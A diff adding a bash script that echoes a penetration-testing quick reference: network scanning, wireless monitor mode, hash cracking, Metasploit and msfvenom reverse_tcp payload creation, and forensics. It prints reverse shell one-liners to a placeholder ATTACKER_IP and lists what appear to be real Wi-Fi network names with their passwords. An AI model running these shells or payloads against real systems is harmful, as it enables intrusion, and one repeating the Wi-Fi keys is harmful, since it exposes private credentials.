@@ -1,0 +1,58 @@
+#!/bin/bash
+# Quick Reference - Most Common Commands
+
+echo "╔══════════════════════════════════════════════════════╗"
+echo "║          QUICK REFERENCE - COMMON COMMANDS        ║"
+echo "╚══════════════════════════════════════════════════════╝"
+echo ""
+
+echo "━━━ NETWORK ━━━"
+echo "  ip addr                 - Show IP addresses"
+echo "  nmap -sn 192.168.1.0/24   - Scan network"
+echo "  netstat -tulpn          - Show listening ports"
+echo "  curl ifconfig.me        - Get external IP"
+echo ""
+
+echo "━━━ WIRELESS ━━━"
+echo "  iwconfig               - Show wireless interfaces"
+echo "  airmon-ng start wlan0  - Enable monitor mode"
+echo "  airodump-ng wlan0mon   - Scan for networks"
+echo "  wash -i wlan0mon        - Find WPS networks"
+echo ""
+
+echo "━━━ PASSWORD ━━━"
+echo "  hashcat -m 0 hash.txt wordlist.txt  - Crack hashes"
+echo "  john --wordlist=pass.txt hash.txt  - Crack with John"
+echo "  crunch 8 8 1234567890 -o wordlist.txt  - Generate wordlist"
+echo ""
+
+echo "━━━ EXPLOITATION ━━━"
+echo "  msfconsole             - Start Metasploit"
+echo "  searchsploit <term>    - Search Exploit-DB"
+echo "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe > shell.exe"
+echo ""
+
+echo "━━━ REVERSE SHELL ━━━"
+echo "  # Attacker (listener): nc -lvp 4444"
+echo "  # Target: bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
+echo "  # Or: python -c 'import socket,subprocess,os;s=socket.socket()'"
+echo "  #       s.connect((\"<ATTACKER_IP>\",4444));os.dup2(s.fileno(),0)"
+echo ""
+
+echo "━━━ FORENSICS ━━━"
+echo "  strings file.bin | grep -i password  - Extract strings"
+echo "  binwalk firmware.bin    - Analyze firmware"
+echo "  foremost -i disk.img   - Carve files"
+echo ""
+
+echo "━━━ WIFI CREDENTIALS ━━━"
+echo "  cat /wifi-passwords/NETWORK-CREDENTIALS.txt"
+echo ""
+echo "  Melton 1: meltonone"
+echo "  TelstraBF869B: E3CF746CF4"
+echo ""
+
+echo "━━━ HELP ━━━"
+echo "  <tool> --help          - Get help"
+echo "  man <command>          - Manual page"
+echo "  apt search <term>      - Search packages"
